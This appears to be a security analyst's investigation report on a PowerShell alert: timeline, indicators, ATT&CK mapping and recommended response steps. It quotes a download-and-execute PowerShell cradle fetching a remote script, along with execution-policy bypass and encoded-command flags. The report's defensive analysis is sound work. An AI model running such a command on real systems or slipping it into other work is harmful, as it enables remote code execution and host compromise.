# Suspicious PowerShell Activity Investigation

## 1. Alert

**Alert:** Suspicious PowerShell Activity
**Severity:** Medium — pending further investigation
**Status:** Escalated for investigation

The alert was triggered by PowerShell activity involving encoded commands, execution-policy bypass, remote script retrieval, and repeated outbound network communication.

## 2. User

**Username:** `alice`

The suspicious PowerShell activity was executed under the `alice` user account.

## 3. Host

**Hostname:** `WIN-CLIENT01`

The affected endpoint was `WIN-CLIENT01`.

## 4. Process

```text
explorer.exe
    └── powershell.exe
```

PowerShell was launched as a child process of `explorer.exe`.

## 5. Timeline

| Time     | Activity                                                       |
| -------- | -------------------------------------------------------------- |
| 14:01:12 | `alice` launches PowerShell                                    |
| 14:01:15 | PowerShell executes `DownloadString()` against external server |
| 14:01:17 | `update.ps1` is downloaded                                     |
| 14:01:20 | Downloaded script is executed                                  |
| 14:06:20 | PowerShell activity occurs again after approximately 5 minutes |
| 14:11:21 | Connection to the same destination occurs                      |
| 14:16:22 | Another connection to the same destination occurs              |

## 6. Command Analysis

The primary suspicious command was:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://185.199.108.153/update.ps1')
```

This command downloads PowerShell code from a remote server and passes the downloaded content to `Invoke-Expression` (`IEX`) for execution.

Additional suspicious PowerShell parameters included:

```text
-NoProfile
-ExecutionPolicy Bypass
-EncodedCommand
```

## 7. File Activity

**Downloaded file:**

```text
update.ps1
```

**Observed path:**

```text
C:\Users\alice\AppData\Local\Temp\update.ps1
```

The use of a temporary user directory is not inherently malicious. However, execution of a remotely downloaded PowerShell script from this location increases the need for investigation.

## 8. Network Activity

**Destination IP:**

```text
185.199.108.153
```

**Domain:**

```text
update-check.com
```

**Protocol:**

```text
HTTP
```

The endpoint repeatedly communicated with the same destination at approximately five-minute intervals.

The repeated pattern is suspicious but, by itself, is insufficient to confirm command-and-control activity.

## 9. MITRE ATT&CK Mapping

| Behavior                   | Technique                                           |
| -------------------------- | --------------------------------------------------- |
| PowerShell execution       | T1059.001 — PowerShell                              |
| Encoded PowerShell command | T1027 — Obfuscated/Compressed Files and Information |
| Downloading remote script  | T1105 — Ingress Tool Transfer                       |

## 10. Verdict

**Suspicious activity requiring escalation.**

The available evidence shows several indicators associated with potentially malicious PowerShell execution. However, the current dataset does not establish that the downloaded script is definitively malicious or that the host was compromised.

Further investigation is required.

## 11. Recommended Response

1. Obtain the `update.ps1` file if available.
2. Calculate its SHA-256 hash.
3. Check the hash against known threat-intelligence sources.
4. Analyze the script contents safely.
5. Investigate the destination IP and domain.
6. Review DNS, proxy, and firewall logs for related activity.
7. Search for the same IP/domain across other endpoints.
8. Investigate persistence mechanisms on `WIN-CLIENT01`.
9. If malicious activity is confirmed, isolate the endpoint according to incident-response procedures.
10. Preserve relevant logs and evidence before remediation.

## 12. Analyst Conclusion

The activity should not be closed as benign based on the current evidence. The combination of encoded PowerShell, execution-policy bypass, remote script download, script execution, and repeated outbound communication justifies escalation and additional investigation.

**Current conclusion: Suspicious — further investigation required.**
